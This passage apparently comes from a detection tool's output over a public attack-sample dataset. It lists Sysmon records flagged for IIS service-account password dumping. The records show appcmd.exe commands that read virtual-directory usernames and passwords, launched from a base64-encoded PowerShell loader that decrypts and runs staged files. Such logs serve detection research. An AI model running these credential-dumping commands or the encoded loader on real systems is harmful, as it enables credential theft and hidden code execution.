AcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2484
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-00104FC3FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.353
"
2019-05-27T01:29:19.473868+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5961,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2168
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-00100FC7FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.433
"
2019-05-27T01:29:19.563997+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5964,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3892
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-0010CFCAFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.513
"
2019-05-27T01:29:19.784314+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5967,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3844
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-0010F2CFFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.714
"
2019-05-27T01:29:19.894473+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5970,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3848
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-0010B2D3FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.834
"
2019-05-27T01:29:19.964573+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5973,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkAL